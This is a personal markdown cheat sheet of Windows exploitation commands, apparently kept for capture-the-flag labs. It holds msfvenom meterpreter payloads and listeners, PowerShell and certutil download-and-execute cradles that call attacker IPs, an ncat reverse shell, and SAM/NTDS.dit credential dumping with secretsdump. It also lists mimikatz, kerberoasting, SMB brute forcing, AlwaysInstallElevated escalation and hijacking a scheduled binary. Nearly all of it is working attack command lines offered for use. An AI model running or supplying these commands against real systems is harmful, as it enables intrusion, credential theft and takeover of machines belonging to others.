# Basic exploit (metasploit) (100 detectable)

## Generate payload

* msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.33.220 LPORT=9001 -f exe > shell.exe
* get payload to target
* start listener before runing

## Start listener

* msfconsole -> use multi/handler
* set PAYLOAD windows/meterpreter/reverse_tcp
* set LHOST <IP> set LPORT 9001
* wait for connection

## Send Netcat 

* powershell curl http://10.8.123.245:8000/ncat.exe -o ncat.exe

# Certutil
* certutil.exe -urlcache -split -f "http://10.99.254.156/msdtl-Service.exe" c:\windows\system32\msdtl.exe

# nishang

* cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
* cp /usr/share/nishang/Shells/Invoke-PowerShellTOneLine.ps1 . => choose one (replace last line)
* python3 -m http.server 8000
* on victim code exec `powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('YOUR SERVER IP:PORT/Online.ps1')"
* * `IEX(IWR YOUR HOST IP:PORT/shell.ps1  -UseBasicParsing)`

# Juicy Potato
* get juicy.exe to victim
* follow online

# Manual Enum
* whoami /all
* net localgroup administrator
* net users administrator
* look for backups
* * copy SAM SYSTEM from Windows/System32/config 
* * if on domain controller grab NTDS.dit SAM SYSTEM to dump AD database
* * `impacket-secretsdump -sam SAM -system SYSTEM local` ==> get second part of hash ==> hashes.org
* *  if hash start with `aad3b4` and `31d6cfe` the account is probably disabled 
* * use smbmap if smb is enabled (vulns/network.md)


## Use for rev shell

* ncat.exe 10.8.123.245 9999 -e powershell

# Test connection

* sudo tcpdump -i tun0 icmp (Listerner)
* ping IP || ping -n 1 IP

# Use Crackmapexec to brute force smbs

* crackmapexec smb IP -u user -p wordlist
* supporta { http, smb, mssql, ldap, ssh, winrm}

# Psexec to login to smb with creds

* /usr/share/doc/python3-impacket/examples/psexec.py TROY.thm/achilles:pass@10.10.122.236

# evil-winrm to login to smb with creds

* evil-winrm -i IP -u achilles -p pass

# Post

* winpeas
* jaws-enum.ps1
* powerup
* net user <user> | for group
* dir flag.txt /s /p || C dir
* .\Rubeus.exe kerberoast /outfilw:dump.txt -> https://github.com/r3motecontrol/Ghostpack-CompiledBinaries || crack hashes with john
* mimikatz exploit
* check Alwayelevate ( allows user to run msi as admin)
* msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.33.220 LPORT=9001 -f msi > shell.msi || on vitim `msiexec /q /i shell.msi

# Unicorn for metasploit reverse shell (upgrade to metasploit)

* python unicorn.py windows/meterpreter/reverse_tcp RHOST RPORT
* use msfconsole -r unicorn.rc
* starts listener
* (addition) just get the encrypted version (only in quotes) => save as exp.html ==> start `python -m SimpleHTTPServer`
* on basic reverse shell `powershell "IEX(New-Object Net.WebClient).downloadString('http://host/exp.html')"


# Post priv esc with metasploit

* background
* search suggester ==> local_exploit suggester
* set SESSION <id>
* use result
* run

# Powershell Empire
* apt get for kali
* A.V Evation, Cred have, situation awareness, lateral movement, persistence  {DEATH star: auto }
* Star killer GUI for kali | starkiller
* power-shell --rest || localhost:1337  || user - empireadmin password - password123
* responder (poisoning, mitm)
* `https://gitlab.com/rpisci2/windows-ccdc/-/wikis/Post-Exploitation/PowerShell-Empire`
* listener->stager->agents

# Find files
* download ripgrep?

# Ippsec Omni video (IOT hack) || Love



# winpeas

* get users
* get update



# Web IIS expoit

* Enumerate directories with nmap
* Hydra brute force admin
* Exploit blog engine 3.3.6.0 (searchsploit -m <path>)
* Edit as PostView.ascx
* upload (read expoit for instructions)
* Listen on port
* Capture session

### Metasploit Cont Version
* msfvenom -l payloads
* msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.33.220 LPORT=9001 -f exe > shell.exe

* sudo python3 -m http.server 8000

* go to c:/Windows/Temp

* powershell -c "Invoke-WebRequest -Uri 'http://10.8.123.245:8000/photo.exe' -Outfile 'C:\Windows\Temp\Hack.exe'"

* msfconsole -> use multi/handler

* set PAYLOAD windows/meterpreter/reverse_tcp

* set LHOST <IP> set LPORT 9001

* .\Hack.exe -> gain meterpreter

* drop to shell

* powershell -c "Invoke-WebRequest -Uri 'http://10.6.33.220:8000/tools/winPEAS/winPEAS.bat' -Outfile 'C:\Windows\Temp\winPEAS.bat'"
*.\winPEAS.bat

* Check for vuln processes -> Windows Scheduler -> Program Files ( Event log says message is ran every 30 sec)

* move payload into `c:\Program Files (x86)\SystemScheduler>`

* meterpreter -> mv message.exe message.bak
* mv shell.exe message.exe
* bg
* run multi/handler
* Gain shell
